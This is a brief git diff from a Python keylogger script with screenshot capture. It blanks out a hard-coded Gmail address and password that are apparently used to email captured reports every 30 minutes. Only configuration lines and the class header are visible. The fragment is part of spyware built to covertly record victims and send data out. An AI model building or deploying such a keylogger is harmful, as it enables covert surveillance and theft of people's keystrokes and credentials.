@@ -11,8 +11,8 @@ from threading import Semaphore, Timer
 import pyscreenshot as ImageGrab #for screenshot
 
 SEND_REPORT_EVERY = 1800  # 30 minutes
-EMAIL_ADDRESS = "wifipwd9@gmail.com" #Enter Email
-EMAIL_PASSWORD = "password" # Enter Password
+EMAIL_ADDRESS = " " #Enter Email
+EMAIL_PASSWORD = " " # Enter Password
 
 class Keylogger:
     def __init__(self, interval):
